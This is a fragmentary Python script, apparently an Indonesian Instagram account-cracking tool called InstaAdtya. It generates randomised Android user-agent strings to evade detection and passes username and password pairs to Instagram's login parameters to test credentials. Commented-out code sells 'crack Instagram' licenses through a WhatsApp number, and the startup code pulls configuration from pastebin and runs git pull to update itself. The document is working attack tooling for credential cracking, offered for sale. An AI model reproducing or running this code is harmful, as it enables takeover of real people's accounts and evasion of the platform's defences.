...
for xc in range(1000):
    rr = random.randint
    rc = random.choice
    a = f"Mozilla/5.0 (Linux; U; Android {str(rr(8,13))}; es-es; Redmi Note 9T Build/SP1A.{str(rr(211111,299999))}.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(100,150))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.14.1-gn"
    ...
    c = f"Mozilla/5.0 (Linux; U; Android {str(rr(7,13))}; zh-CN; Infinix X6511B Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(2500,2900))}.{str(rr(75,150))} HiBrowser/2.5.016 UWS/ Mobile Safari/537.36"
	...
	def checkAPI(self,usr,pwd):
		try:
			...
			param={
					...
					'username': usr,
					'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{xyaaXD}:{pwd}'}
...
# 	try:ses = requests.Session();asu = ses.get("https://app.cryptolens.io/api/key/Activate?token===&ProductId=17483&Key=%s&Sign=True"%(key)).json()['licenseKey']['key'];open("data/lisensi.txt","w").write(key);prints(Panel(f"{P2}selamat lisensi yang anda masukan terdaftar ke server InstaAdtya",width=80,padding=(0,6),style=f"{color_table}"));time.sleep(4);AdtyaStart()
# 	except KeyError:
...
# 	try:x = requests.get("https://app.cryptolens.io/api/key/Activate?token=WyIyODcxODY3OSIsIlkwRHVlQXhTWVRFcHIwQnF1Q1kyYzd6aUIzcDQ1OGxFdk84UTBqd1ciXQ==&ProductId=17483&Key=%s"%(x)).json()['licenseKey']['key'];AdtyaStart()
# 	except KeyError:
# 		prints(Panel(f"{P2}lisensi kamu sudah kedaluwarsa silahkan beli lisensi ke admin",width=80,padding=(0,6),style=f"{color_table}"));os.system("rm -rf data/lisensi.txt");os.system("xdg-open https://wa.me/+16143244921?text=assalamualaikum+bang+mau+beli+lisensi+crack+Instagram");time.sleep(2);exit()
...
#     elif zxc in ["1","01"]:jalan(f"{P}[{M}!{P}] anda akan di arahkan ke WhatsApp");os.system("xdg-open https://wa.me/+16143244921?text=assalamualaikum+bang+mau+beli+lisensi+1+minggu");time.sleep(2);exit()
#     elif zxc in ["2","02"]:jalan(f"{P}[{M}!{P}] anda akan di arahkan ke WhatsApp");os.system("xdg-open https://wa.me/+16143244921?text=assalamualaikum+bang+mau+beli+lisensi+1+bulan");time.sleep(2);exit()
#     elif zxc in ["3","03"]:jalan(f"{P}[{M}!{P}] anda akan di arahkan ke WhatsApp");os.system("xdg-open https://wa.me/+16143244921?text=assalamualaikum+bang+mau+beli+lisensi+full+source");time.sleep(2);exit()
...
if __name__=='__main__':
	lisensiku.append("sukses")
	try:
		with requests.Session() as adit:
			ko = adit.get('https://pastebin.com/raw/S92cvsrG').json()
			HARIS.update(ko)
			ki = adit.get('https://pastebin.com/raw/HgttQbWx').json()
			HARIS1.update(ki)
			os.system("git pull")
			AdtyaStart()
	except requests.exceptions.ConnectionError:
